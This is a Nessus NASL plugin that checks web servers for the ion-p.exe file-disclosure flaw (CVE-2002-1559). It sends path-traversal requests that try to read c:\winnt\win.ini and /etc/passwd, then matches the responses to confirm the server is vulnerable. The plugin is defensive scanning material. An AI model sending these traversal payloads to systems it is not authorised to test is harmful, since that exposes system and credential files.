#
# This script was written by John Lampe...j_lampe@bellsouth.net 
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(11729);
 script_bugtraq_id(6091);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2002-1559");
 
 
 name["english"] = "ion-p.exe vulnerability";
 name["francais"] = "ion-p.exe vulnerability";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The ion-p.exe exists on this webserver.  
Some versions of this file are vulnerable to remote exploit.
An attacker, exploiting this vulnerability, may be able to gain
access to confidential data and/or escalate their privileges on
the Web server.

Solution : remove it from the cgi-bin or scripts directory.

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the ion-p.exe file";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 John Lampe",
		francais:"Ce script est Copyright (C) 2003 John Lampe");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

flag = 0;
directory = "";

foreach dir (cgi_dirs()) {
	req = http_get(item: dir + "/ion-p.exe?page=c:\\winnt\\win.ini", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if( res == NULL ) exit(0);
	
	if (egrep(pattern:".*\[fonts\].*", string:res, icase:TRUE)) {
			security_hole(port);
			exit(0);
		}
		
	req = http_get(item: dir + "/ion-p.exe?page=../../../../../etc/passwd", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if (egrep(pattern:".*root:.*:0:[01]:.*", string:res)) 
	{
	 security_hole(port);
	 exit(0);
	}
}
